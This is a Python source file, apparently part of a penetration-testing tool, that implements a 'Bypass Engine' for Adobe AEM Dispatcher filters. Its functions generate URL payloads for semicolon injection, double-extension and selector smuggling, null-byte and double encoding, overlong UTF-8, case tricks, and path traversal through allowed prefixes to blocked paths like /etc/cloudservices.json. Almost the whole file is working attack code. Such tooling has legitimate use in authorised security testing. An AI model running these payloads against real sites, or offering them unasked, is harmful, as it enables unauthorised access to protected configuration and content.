"""Bypass Engine - Transformer functions for Dispatcher bypass techniques."""

import random
import urllib.parse
from typing import List, Callable, Dict, Optional
from dataclasses import dataclass

from core.models import BypassTechnique


@dataclass
class BypassResult:
    """Result from a bypass transformation."""
    url: str
    technique: BypassTechnique
    description: str
    priority: int = 1  # Higher = try first


class BypassTransformer:
    """Main bypass transformer engine."""
    
    # AEM selectors for content negotiation
    SELECTORS = [
        ".json", ".xml", ".txt", ".html", ".infinite.json",
        ".tidy.json", ".tidy.infinity.json", ".1.json", ".2.json",
        ".4.json", ".5.json", ".10.json", ".-1.json", ".-2.json",
        ".hxp.xml", ".html.json", ".json.html", ".pdf.json",
    ]
    
    # Double extension patterns
    EXTENSION_PAIRS = [
        (".json", ".html"),
        (".xml", ".json"),
        (".txt", ".json"),
        (".html", ".json"),
        (".css", ".json"),
        (".ico", ".json"),
    ]
    
    # Common path variants
    PATH_VARIANTS = [
        "/", "//", "/./", "/../", "/.../", "/....//",
        "/%2f", "/%2F", "/%5c", "/%5C",
    ]
    
    def __init__(self):
        self.transformers: Dict[BypassTechnique, Callable] = {
            BypassTechnique.SEMICOLON: self.semicolon_injection,
            BypassTechnique.DOUBLE_EXTENSION: self.double_extension,
            BypassTechnique.SELECTOR_SMUGGLING: self.selector_smuggling,
            BypassTechnique.NULL_BYTE: self.null_byte_injection,
            BypassTechnique.URL_ENCODING: self.url_encoding,
            BypassTechnique.DOUBLE_ENCODING: self.double_encoding,
            BypassTechnique.PATH_TRAVERSAL: self.path_traversal,
            BypassTechnique.UNICODE: self.unicode_normalization,
            BypassTechnique.CASE_SENSITIVITY: self.case_sensitivity,
            BypassTechnique.SEMICOLON_GAP: self.semicolon_gap,
            BypassTechnique.PATH_OVERLAP: self.path_overlap,
        }
    
    def transform(self, base_path: str, technique: Optional[BypassTechnique] = None) -> List[BypassResult]:
        """Apply bypass transformation(s) to a path."""
        if technique:
            return self.transformers.get(technique, lambda x: [])(base_path)
        
        results = []
        for t in BypassTechnique:
            results.extend(self.transformers[t](base_path))
        return results
    
    def semicolon_injection(self, path: str) -> List[BypassResult]:
        """Semicolon path parameter injection bypass.
        
        Based on CVE-2016-0957 and similar patterns.
        Example: /admin;a=b becomes /admin with parameter a=b
        """
        results = []
        injections = [
            ";/", ";x=y/", ";a=b/", ";foo=bar/",
            "/..;/", "/..;/..;/", "/..;/..;/..;/",
            "/%3b/", "/%3B/",
        ]
        
        for injection in injections:
            # Insert semicolon at various positions
            if "/" in path:
                parts = path.rstrip("/").split("/")
                for i in range(1, len(parts)):
                    new_path = "/".join(parts[:i]) + injection + "/".join(parts[i:])
                    results.append(BypassResult(
                        url=new_path,
                        technique=BypassTechnique.SEMICOLON,
                        description=f"Semicolon injection at position {i}: {injection}",
                        priority=10
                    ))
            
            # Append semicolon patterns
            results.append(BypassResult(
                url=path.rstrip("/") + injection,
                technique=BypassTechnique.SEMICOLON,
                description=f"Semicolon suffix: {injection}",
                priority=8
            ))
        
        return results
    
    def double_extension(self, path: str) -> List[BypassResult]:
        """Double extension bypass.
        
        Exploits dispatcher rules that check only final extension.
        Example: /admin.html.json serves JSON of admin.html
        """
        results = []
        base = path.rstrip("/")
        
        for first, second in self.EXTENSION_PAIRS:
            results.append(BypassResult(
                url=f"{base}{first}{second}",
                technique=BypassTechnique.DOUBLE_EXTENSION,
                description=f"Double extension: {first}{second}",
                priority=9
            ))
            
            # Reverse order
            results.append(BypassResult(
                url=f"{base}{second}{first}",
                technique=BypassTechnique.DOUBLE_EXTENSION,
                description=f"Reversed double extension: {second}{first}",
                priority=7
            ))
        
        # Triple extensions
        results.append(BypassResult(
            url=f"{base}.html.json.html",
            technique=BypassTechnique.DOUBLE_EXTENSION,
            description="Triple extension confusion",
            priority=6
        ))
        
        return results
    
    def selector_smuggling(self, path: str) -> List[BypassResult]:
        """Selector smuggling via alternative content types."""
        results = []
        base = path.rstrip("/")
        
        for selector in self.SELECTORS:
            results.append(BypassResult(
                url=f"{base}{selector}",
                technique=BypassTechnique.SELECTOR_SMUGGLING,
                description=f"Selector smuggling: {selector}",
                priority=10
            ))
            
            # Multiple selectors
            for selector2 in random.sample(self.SELECTORS, 3):
                results.append(BypassResult(
                    url=f"{base}{selector}{selector2}",
                    technique=BypassTechnique.SELECTOR_SMUGGLING,
                    description=f"Multiple selectors: {selector}{selector2}",
                    priority=5
                ))
        
        # URL-encoded selectors
        for selector in [".json", ".xml", ".txt"]:
            encoded = urllib.parse.quote(selector, safe="")
            results.append(BypassResult(
                url=f"{base}{encoded}",
                technique=BypassTechnique.SELECTOR_SMUGGLING,
                description=f"URL-encoded selector: {encoded}",
                priority=4
            ))
        
        return results
    
    def null_byte_injection(self, path: str) -> List[BypassResult]:
        """Null byte injection for path truncation."""
        results = []
        base = path.rstrip("/")
        
        # Classic null byte
        for suffix in [".txt", ".html", ".json", ".jpg"]:
            results.append(BypassResult(
                url=f"{base}%00{suffix}",
                technique=BypassTechnique.NULL_BYTE,
                description=f"Null byte with {suffix} suffix",
                priority=3
            ))
        
        # Alternative encodings
        encodings = ["%00", "%0a", "%0d", "%0d%0a", "%2f", "%5c"]
        for enc in encodings:
            results.append(BypassResult(
                url=f"{base}{enc}",
                technique=BypassTechnique.NULL_BYTE,
                description=f"Alternative encoding: {enc}",
                priority=2
            ))
        
        return results
    
    def url_encoding(self, path: str) -> List[BypassResult]:
        """Various URL encoding techniques."""
        results = []
        
        # Encode different characters
        encodings = {
            "/": ["%2f", "%2F", "%252f", "%252F"],
            ".": ["%2e", "%2E", "%252e", "%252E"],
            ";": ["%3b", "%3B"],
            "=": ["%3d", "%3D"],
        }
        
        for char, encs in encodings.items():
            if char in path:
                for enc in encs:
                    new_path = path.replace(char, enc, 1)
                    results.append(BypassResult(
                        url=new_path,
                        technique=BypassTechnique.URL_ENCODING,
                        description=f"URL encode '{char}' -> '{enc}'",
                        priority=6
                    ))
        
        # Full path encoding
        results.append(BypassResult(
            url=urllib.parse.quote(path, safe="/"),
            technique=BypassTechnique.URL_ENCODING,
            description="Full path encoding",
            priority=3
        ))
        
        return results
    
    def double_encoding(self, path: str) -> List[BypassResult]:
        """Double URL encoding bypass."""
        results = []
        
        # Double encode specific characters
        double_encodings = {
            "/": ["%252f", "%252F", "%255c", "%255C"],
            ".": ["%252e", "%252E"],
        }
        
        for char, encs in double_encodings.items():
            if char in path:
                for enc in encs:
                    new_path = path.replace(char, enc, 1)
                    results.append(BypassResult(
                        url=new_path,
                        technique=BypassTechnique.DOUBLE_ENCODING,
                        description=f"Double encoding '{char}' -> '{enc}'",
                        priority=7
                    ))
        
        return results
    
    def path_traversal(self, path: str) -> List[BypassResult]:
        """Path traversal with various encodings."""
        results = []
        base = path.rstrip("/")
        
        traversals = [
            "/../", "/..%2f", "/..%2F", "/..%252f", "/..%252F",
            "/%2e%2e/", "/%252e%252e/",
            "/....//", "/...//", "/.....//",
        ]
        
        for trav in traversals:
            results.append(BypassResult(
                url=f"{base}{trav}",
                technique=BypassTechnique.PATH_TRAVERSAL,
                description=f"Path traversal: {trav}",
                priority=8
            ))
        
        # Dot-dot-slash variations
        for i in range(2, 6):
            dots = "/" + "../" * i
            results.append(BypassResult(
                url=f"{base}{dots}etc/config.json",
                technique=BypassTechnique.PATH_TRAVERSAL,
                description=f"Multiple traversal ({i} levels)",
                priority=5
            ))
        
        return results
    
    def unicode_normalization(self, path: str) -> List[BypassResult]:
        """Unicode normalization bypasses."""
        results = []
        base = path.rstrip("/")
        
        # Unicode equivalents
        unicode_slash = ["%ef%bc%8f", "\uff0f"]
        unicode_dot = ["%ef%bc%8e", "\uff0e"]
        
        for us in unicode_slash:
            results.append(BypassResult(
                url=base.replace("/", us),
                technique=BypassTechnique.UNICODE,
                description=f"Unicode slash: {us}",
                priority=4
            ))
        
        # Overlong UTF-8 encodings
        overlong = {
            "/": ["%c0%af", "%e0%80%af", "%f0%80%80%af"],
            ".": ["%c0%ae", "%e0%80%ae", "%f0%80%80%ae"],
        }
        
        for char, encs in overlong.items():
            if char in path:
                for enc in encs:
                    results.append(BypassResult(
                        url=path.replace(char, enc, 1),
                        technique=BypassTechnique.UNICODE,
                        description=f"Overlong UTF-8: {enc}",
                        priority=3
                    ))
        
        return results
    
    def case_sensitivity(self, path: str) -> List[BypassResult]:
        """Case sensitivity bypass for Dispatcher rules.
        
        Many dispatchers match case-sensitively while the JCR/Sling
        backend is case-insensitive. E.g. /ETc/COnfig bypasses /etc rules.
        """
        results = []
        parts = path.strip("/").split("/")
        
        if not parts or not parts[0]:
            return results
        
        def _case_permutations(s: str, max_perms: int = 4) -> List[str]:
            """Generate mixed-case permutations of a string."""
            perms = set()
            perms.add(s.upper())
            perms.add(s.capitalize())
            perms.add(s[0].upper() + s[1:].lower() if len(s) > 1 else s.upper())
            # Alternating case
            alt = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))
            perms.add(alt)
            perms.discard(s)  # Remove original
            return list(perms)[:max_perms]
        
        # Permute each path segment
        for i, part in enumerate(parts):
            for variant in _case_permutations(part):
                new_parts = parts.copy()
                new_parts[i] = variant
                new_path = "/" + "/".join(new_parts)
                results.append(BypassResult(
                    url=new_path,
                    technique=BypassTechnique.CASE_SENSITIVITY,
                    description=f"Case variant segment {i}: {part} -> {variant}",
                    priority=7
                ))
        
        # Full path mixed-case
        full_mixed = "/" + "/".join(
            "".join(c.upper() if j % 2 == 0 else c.lower() for j, c in enumerate(p))
            for p in parts
        )
        if full_mixed != path:
            results.append(BypassResult(
                url=full_mixed,
                technique=BypassTechnique.CASE_SENSITIVITY,
                description="Full path alternating case",
                priority=6
            ))
        
        # Dot-encoded path variants
        base = path.rstrip("/")
        dot_encoded_variants = [
            f"{base}.%2e.json",
            f"{base}.json/..;/.",
            f"{base}/.json",
        ]
        for v in dot_encoded_variants:
            results.append(BypassResult(
                url=v,
                technique=BypassTechnique.CASE_SENSITIVITY,
                description=f"Dot-encoded variant: {v}",
                priority=8
            ))
        
        return results
    
    def semicolon_gap(self, path: str) -> List[BypassResult]:
        """Semicolon gap automator.
        
        Automatically inserts `;` at every position in the path.
        E.g. /etc/config -> /;etc/config, /etc;/config, /etc/;config, etc.
        """
        results = []
        parts = path.strip("/").split("/")
        
        if not parts or not parts[0]:
            return results
        
        # Insert ; before each segment
        for i in range(len(parts)):
            new_parts = parts.copy()
            new_parts[i] = ";" + new_parts[i]
            new_path = "/" + "/".join(new_parts)
            results.append(BypassResult(
                url=new_path,
                technique=BypassTechnique.SEMICOLON_GAP,
                description=f"Semicolon before segment {i}: ;{parts[i]}",
                priority=9
            ))
        
        # Insert ; after each segment
        for i in range(len(parts)):
            new_parts = parts.copy()
            new_parts[i] = new_parts[i] + ";"
            new_path = "/" + "/".join(new_parts)
            results.append(BypassResult(
                url=new_path,
                technique=BypassTechnique.SEMICOLON_GAP,
                description=f"Semicolon after segment {i}: {parts[i]};",
                priority=9
            ))
        
        # Insert /;/ between segments
        for i in range(len(parts) - 1):
            new_parts = parts.copy()
            new_path = "/" + "/".join(new_parts[:i+1]) + "/;/" + "/".join(new_parts[i+1:])
            results.append(BypassResult(
                url=new_path,
                technique=BypassTechnique.SEMICOLON_GAP,
                description=f"Semicolon gap between segment {i} and {i+1}",
                priority=10
            ))
        
        # Semicolon with param between segments
        for i in range(len(parts) - 1):
            new_path = "/" + "/".join(parts[:i+1]) + ";a=b/" + "/".join(parts[i+1:])
            results.append(BypassResult(
                url=new_path,
                technique=BypassTechnique.SEMICOLON_GAP,
                description=f"Semicolon param gap between segment {i} and {i+1}",
                priority=8
            ))
        
        return results
    
    def path_overlap(self, path: str) -> List[BypassResult]:
        """Path overlap bypass.
        
        Uses traversal through allowed paths to reach blocked ones.
        E.g. /content/dam/..;/..;/etc/cloudservices.json
        """
        results = []
        base = path.rstrip("/")
        
        # Allowed-path prefixes that dispatchers typically permit
        allowed_prefixes = [
            "/content", "/content/dam", "/content/sites",
            "/libs/cq", "/libs/granite",
        ]
        
        # Traversal patterns
        traversal_patterns = [
            "/..;/..;",
            "/../..",
            "/..%3b/..%3b",
            "/..;/..;/..;",
            "/%2e%2e/%2e%2e",
            "/../..;/..;",
        ]
        
        for prefix in allowed_prefixes:
            for trav in traversal_patterns:
                # Calculate needed depth
                prefix_depth = prefix.count("/")
                overlap_url = f"{prefix}{trav}{base}"
                results.append(BypassResult(
                    url=overlap_url,
                    technique=BypassTechnique.PATH_OVERLAP,
                    description=f"Path overlap: {prefix} + traversal to {base}",
                    priority=11
                ))
                
                # With .json suffix
                results.append(BypassResult(
                    url=f"{overlap_url}.json",
                    technique=BypassTechnique.PATH_OVERLAP,
                    description=f"Path overlap + .json: {prefix} -> {base}",
                    priority=11
                ))
        
        return results
    
    def generate_all_variants(self, path: str, max_results: int = 100) -> List[BypassResult]:
        """Generate all bypass variants for a path, sorted by priority."""
        all_results = []
        
        for technique in BypassTechnique:
            results = self.transformers[technique](path)
            all_results.extend(results)
        
        # Sort by priority (descending) and deduplicate
        all_results.sort(key=lambda x: x.priority, reverse=True)
        
        seen = set()
        unique = []
        for r in all_results:
            if r.url not in seen and len(unique) < max_results:
                seen.add(r.url)
                unique.append(r)
        
        return unique
